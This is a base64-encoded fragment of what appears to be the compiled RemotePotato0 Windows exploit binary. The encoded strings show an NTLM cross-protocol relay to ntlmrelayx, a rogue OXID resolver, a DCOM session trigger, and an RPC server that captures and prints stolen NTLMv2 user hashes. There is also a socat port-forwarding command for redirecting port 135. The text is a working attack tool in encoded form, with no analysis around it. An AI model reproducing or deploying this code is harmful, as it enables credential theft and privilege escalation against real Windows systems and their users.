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gU2VydmVyIHZlcnNpb24gY29tcGF0aWJsZSB3aXRoIEp1aWN5UG90YXRvLiBSb2d1ZU94aWRSZXNvbHZlciBjYW4gYmUgcnVuIGxvY2FsbHkgb24gMTI3LjAuMC4xCgAAAFshXSBEZXRlY3RlZCBhIFdpbmRvd3MgU2VydmVyIHZlcnNpb24gbm90IGNvbXBhdGlibGUgd2l0aCBKdWljeVBvdGF0bywgeW91IGNhbm5vdCBydW4gdGhlIFJvZ3VlT3hpZFJlc29sdmVyIG9uIDEyNy4wLjAuMS4gUm9ndWVPeGlkUmVzb2x2ZXIgbXVzdCBiZSBydW4gcmVtb3RlbHkuCgAAAAAAAFshXSBFeGFtcGxlIE5ldHdvcmsgcmVkaXJlY3RvcjogCglzdWRvIHNvY2F0IC12IFRDUC1MSVNURU46MTM1LGZvcmsscmV1c2VhZGRyIFRDUDp7e1RoaXNNYWNoaW5lSXB9fTolUwoAWypdIERldGVjdGVkIGEgV2luZG93cyBTZXJ2ZXIgdmVyc2lvbiBub3QgY29tcGF0aWJsZSB3aXRoIEp1aWN5UG90YXRvLiBSb2d1ZU94aWRSZXNvbHZlciBtdXN0IGJlIHJ1biByZW1vdGVseS4gUmVtZW1iZXIgdG8gZm9yd2FyZCB0Y3AgcG9ydCAxMzUgb24gJVMgdG8geW91ciB2aWN0aW0gbWFjaGluZSBvbiBwb3J0ICVTCgAAAAAAAAAAWypdIEV4YW1wbGUgTmV0d29yayByZWRpcmVjdG9yOiAKCXN1ZG8gc29jYXQgLXYgVENQLUxJU1RFTjoxMzUsZm9yayxyZXVzZWFkZHIgVENQOnt7VGhpc01hY2hpbmVJcH19OiVTCgAxADMANQAAAFshXSBSZW1vdGUgSFRUUCBSZWxheSBzZXJ2ZXIgaXAgbXVzdCBiZSBzZXQgaW4gbW9kdWxlIDAgYW5kIDEsIHNldCBpdCB3aXRoIHRoZSAtciBmbGFnLgoAAAAAWypdIFN0YXJ0aW5nIHRoZSBOVExNIHJlbGF5IGF0dGFjaywgbGF1bmNoIG50bG1yZWxheXggb24gJVMhIQoAAAAAAABbKl0gU3RhcnRpbmcgdGhlIFJQQyBzZXJ2ZXIgdG8gY2FwdHVyZSB0aGUgY3JlZGVudGlhbHMgaGFzaCBmcm9tIHRoZSB1c2VyIGF1dGhlbnRpY2F0aW9uISEKAAAAAAB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AQwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAAFsqXSBDYWxsaW5nIENvR2V0SW5zdGFuY2VGcm9tSVN0b3JhZ2Ugd2l0aCBDTFNJRDolUwoAAAAAWyFdIEVycm9yLiBDTFNJRCAlUyBub3QgZm91bmQuIEJhZCBwYXRoIHRvIG9iamVjdC4KAFshXSBFcnJvci4gVHJpZ2dlciBEQ09NIGZhaWxlZCB3aXRoIHN0YXR1czogMHgleAoAAAB7ADAAMAAwADAAMAAzADMAQwAtADAAMAAwADAALQAwADAAMAAwAC0AYwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAAFsqXSBTcGF3bmluZyBDT00gb2JqZWN0IGluIHRoZSBzZXNzaW9uOiAlZAoAWypdIENhbGxpbmcgU3RhbmRhcmRHZXRJbnN0YW5jZUZyb21JU3RvcmFnZSB3aXRoIENMU0lEOiVTCgAAWyFdIEVycm9yLiBUcmlnZ2VyIERDT00gZmFpbGVkIHdpdGggc3RhdHVzOiAweCV4IC0gJXMKAABSdGxHZXRWZXJzaW9uAAAAbgB0AGQAbABsAC4AZABsAGwAAAAKCglSZW1vdGVQb3RhdG8wCglAc3BsaW50ZXJfY29kZSAmIEBkZWNvZGVyX2l0CgoKCgAATWFuZGF0b3J5IGFyZ3M6IAotbSBtb2R1bGUKCUFsbG93ZWQgdmFsdWVzOgoJMCAtIFJwYzJIdHRwIGNyb3NzIHByb3RvY29sIHJlbGF5IHNlcnZlciArIHBvdGF0byB0cmlnZ2VyIChkZWZhdWx0KQoJMSAtIFJwYzJIdHRwIGNyb3NzIHByb3RvY29sIHJlbGF5IHNlcnZlcgoJMiAtIFJwYyBjYXB0dXJlIChoYXNoKSBzZXJ2ZXIgKyBwb3RhdG8gdHJpZ2dlcgoJMyAtIFJwYyBjYXB0dXJlIChoYXNoKSBzZXJ2ZXIKAAAKCgAAT3RoZXIgYXJnczogKHNvbWVvbmUgY291bGQgYmUgbWFuZGF0b3J5IGFuZC9vciBvcHRpb25hbCBiYXNlZCB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//wAAAAD+////L0xAAD1MQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAPV9AAAAAAAD0XkAA/l5AAP7///8AAAAApP///wAAAAD+////AAAAAE9dQAAAAAAAmVxAAKNcQABAAAAAAAAAAAAAAADxXUAA/////wAAAAD/////AAAAAAAAAAAAAAAAAQAAAAEAAABAIEIAIgWTGQIAAABQIEIAAQAAAGAgQgAAAAAAAAAAAAAAAAABAAAA/v///wAAAADQ////AAAAAP7///8RVEAAFVRAAAAAAAD+////AAAAANj///8AAAAA/v///75UQADCVEAAAAAAAPAkQAAAAAAA5CBCAAIAAADwIEIAICVCAAAAAAAEOUIAAAAAAP////8AAAAADAAAALtbQAAAAAAA/v///wAAAADY////AAAAAP7////da0AA7WtAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAADxakAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHRvQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAGW9AAP////+agkEAIgWTGQEAAACMIUIAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/v///wAAAADU////AAAAAP7///8AAAAA97hAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAZwkAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAJzDQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAQcNAAAAAAAD+////AAAAANj///8AAAAA/v///xHIQAAVyEAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAIbQQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAD9FAAAAAAAD+////AAAAALT///8AAAAA/v///wAAAAC70UAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAACDVQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAAdxAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAAAb3UAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAGzcQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAwdxAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAACG/UAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAANP4QAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAATAZBAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADJDkEAAAAAAP7///8AAAAAvP///wAAAAD+////AAAAAPQSQQAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAsxBBAAAAAAD+////AAAAAND///8AAAAA/v///wAAAADyGUEAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAJIaQQAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAUiNB